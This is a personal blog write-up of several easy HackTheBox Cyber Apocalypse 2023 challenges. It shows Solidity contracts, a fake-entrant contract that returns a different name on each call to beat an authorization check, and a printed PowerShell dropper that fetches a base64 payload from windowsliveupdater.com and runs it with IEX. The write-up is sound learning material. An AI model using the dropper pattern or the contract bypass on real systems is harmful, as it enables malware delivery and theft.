---
author: Florian Idelberger
title: CTF Writeup - HackTheBox - Cyber Apocalypse 2023
date: 2023-03-24
draft: false
description: My writeup from participating in a bigger CTF
---

#CTF Writeup - HackTheBox - Cyber Apocalypse 2023

These last five days, I participated in my first CTF,  partially because I wanted to get more comfortable with security topics and certain low-level computing topics, and the opportunity presented itself as some people in the channel of a hackerspace had asked for additional team members.

The Cyber Apocalypse event by HackTheBox was quite big, with 74 challenges spanning five days. However, we took it a bit easy, and everybody just tried to solve what they felt most comfortable with or wanted to do. It was a lot of fun, for sure, and I learned a lot. Below I will try to describe the challenges that I solved. These were all relatively easy, but maybe it is still helpful for some.

Despite blockchain not being as hyped anymore, there were blockchain challenges. As I did some testing and security in this area, these were relatively easy points.

## Blockchain - Navigating the Unknown

For people unfamiliar with blockchain development, this challenge provided a Readme to give some basic pointers, which is rather unusual compared to all other challenges. However, even I learned something new as they mentioned a new rust-based CLI tool (foundry-rs (https://book.getfoundry.sh/r)) which can be used for all aspects instead of using a testing framework or using remix-ide of web3.py manually. After getting to know it a bit, I found it really nice to use.

![](../static/images/blockchain_unknown.png)

```
pragma solidity ^0.8.18;


contract Unknown {

    bool public updated;

     function updateSensors(uint256 version) external {
         if (version == 10) {
             updated = true;
         }
     }

 }
```

The blockchain challenges all provided the source code. Which definitely made things easier.
In addition, you got two `url:port` key-value pairs, one of which was the RPC URL for the example blockchain, the other one was a small web service, f.e. usable with netcat (as also explained in the README), which provided you with the necessary connection information for the blockchain, which was spawned in a docker container. This information always consisted of the private key, user address corresponding to that key, target contract, and setup contract. It also allowed you to restart the instance and retrieve the flag if you satisfied the target condition. The setup contract set up the target contract and was also used to see and check for the target condition.

In this first challenge, the goal was mainly to call a certain function with an integer parameter to set "version" to 10. With the setup contract and its `iSolved()` function, you could then check if this was successful.

The main annoying thing about that was that I had to decide which environment I wanted to use and which tooling, and then I probably had to update it. In the end, I didn't really use web3.py but used foundry-rs for executing transactions. For testing code-based exercises (mainly the 3rd one), I used remix-ide, as this also allows for testing transactions on a virtual chain.

Foundry has separate tools, depending on what you need. For transactions, `cast` is the right tool. Such as `cast send <target contract> 0x... "updateSensor(uint256)" 0x10 --priv-key <privatekey> --rpc-url http://<ip>:<port>`

In some cases, the value would have to be converted to a proper type and maybe even packed for the abi, but AFAIR, in this case, that was not necessary.

Subsequently, you can then check if it worked and is recognized by calling `isSolved()` on the setup contract in the same way. Over the netcat service, you could then get the flag, which did the same, I assume.

## Blockchain - Shooting 101

Shooting 101 was slightly more involved, but only in so far that you had to perform three specific transactions in the right order.

As you can see, based on the `require` conditions and modifiers, they can only be performed in their predetermined order.


```
  contract ShootingArea {
     bool public firstShot;
     bool public secondShot;
     bool public thirdShot;

     modifier firstTarget() {
         require(!firstShot && !secondShot && !thirdShot);
         _;
     }

     modifier secondTarget() {
         require(firstShot && !secondShot && !thirdShot);
         _;
     }

     modifier thirdTarget() {
         require(firstShot && secondShot && !thirdShot);
         _;
     }

     receive() external payable secondTarget {
         secondShot = true;
     }

     fallback() external payable firstTarget {
         firstShot = true;
     }

     function third() public thirdTarget {
         thirdShot = true;      }

```

For the first target, you had to trigger the fallback function. This meant that you f.e. send a transaction with a function signature that is not defined (or some other conditions that you could check in the docs), which then triggers this function. For the second target, you had to send an arbitrary amount of Ether, thereby triggering the `receive()` function. The third one was then a normal function call transaction, if I remember correctly. Then again, get the flag from netcat.

## Blockchain - The Art of deception

This one was labelled as one difficulty greater, but still only easy. Embarrassingly, this gave me more trouble than I would have thought. The target contract implements an authorization procedure and provides an external interface, `Entrant`. While I briefly thought that maybe string comparison could somehow be broken, this is unlikely and definitely not easy. So I quickly decided that the external interface has to be the likely target, as there were no other likely options, and why else would it be implemented as an interface with an external function? Admittedly, I was a bit hesitant to start on it at first because implementing the interface in another contract would mean that I would actually have to write code. ^^

```
pragma solidity ^0.8.18;


 interface Entrant {
     function name() external returns (string memory);
 }

 contract HighSecurityGate {

     string[] private authorized = ["Orion", "Nova", "Eclipse"];
     string public lastEntrant;

     function enter() external {
         Entrant _entrant = Entrant(msg.sender);

         require(_isAuthorized(_entrant.name()), "Intruder detected");
         lastEntrant = _entrant.name();
     }

     function _isAuthorized(string memory _user) private view returns (bool){
         for (uint i; i < authorized.length; i++){
             if (strcmp(_user, authorized[i])){
                 return true;
             }
         }
         return false;
     }

     function strcmp(string memory _str1, string memory _str2) public pure returns (bool){
         return keccak256(abi.encodePacked(_str1)) == keccak256(abi.encodePacked(_str2));
     }
 }
```

In a new contract, I then implemented EntrantFake, which instantiates the target contract to be able to call it and implements the Entrant interface and the name function for it.

In this case, the `Setup.sol` contract showed that it checked if `lastEntrant` was set to "Pandora".
The main thing that took me way too long was - I was at first convinced that if done right, maybe just implementing the name function and just returning the name "Pandora" should suffice somehow. In the end, I realized that within one call, separate calls to name could return different values if implemented that way, as the stack is necessarily shared within one transaction. Thus the first time name is called, it can return a valid name, but the second time when `lastEntrant` is set, it can return "Pandora".

By implementing this malicious name function and then calling the enter function in the target contract, the malicious name is then used as part of the target contract.

```
pragma solidity ^0.8.18;

import {HighSecurityGate, Entrant} from "./FortifiedPerimeter.sol";

contract EntrantFake is Entrant {

   HighSecurityGate contractInstance = HighSecurityGate(0x50003d99be68c8C270dC1dD00aD42A277dfC6B8c);
   uint i = 0;
   function name() external override returns (string memory) {
         string memory b = "";
         if (i  == 0) {
         b = "Orion";
         i = i + 1;
         } else {
         b = "Pandora";
         }
         return b;
     }

     function test() external {
     contractInstance.enter();

     }
 }
```
   
   Once `lastEntrant` is set, the flag could then be retrieved from the web service. For trying different solutions, remix-ide and its virtual chain were very helpful. Really the best way to try these is with remix-ide.
   
Interesting addendum - because at first, I thought there must be some way to do this without returning different things via name(), I researched a bit and asked ChatGPT. As I hear, that's a thing these days. TBH, I was not impressed - especially on the Solidity code. It frequently gave just plain wrong answers and or said one right thing mixed with wrong ones, and often even did not remember when I told it that something was wrong.

## Reversing - Needle in a haystack

This challenge gave you a binary to analyze. However, it was not even necessary to disassemble it or similar, as you could just pass it to the `strings` utility, which then shows you all strings in the binary, including the flag needed to complete the challenge.

## Forensics - Alien Cradle

This challenge gave you a PowerShell script. In case you executed it, which would, of course, be a bad idea in most cases, it rickrolled you by opening the requisite video in your browser. However, I learned that there is also PowerShell for Linux and macOS, which was new to me.

```if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();```

When actually looking at the source, it was immediately obvious that the flag was just being concatenated. These separate parts could then just be pierced together. 

## Hardware - Critical Flight

This challenge gave you a set of Gerber files to open with a PCB design or viewing tool. These were not hidden in any way or similar, so if you knew or could somehow figure out with which tool to open them, this was really easy and quick. I just opened them with gerberview from KiCad, and then just went through each layer, where two of them contained one part of the flag each.

![](static/images/kicad.png)

# Partial Solves

I think I solved some at least partially. Of those, I wanted to share at least the ones that I found most interesting. These will be added soon.

## Reversing - Hunting License Partial Solve



## Reversing - C Shells

## Hardware - Timed Transmission

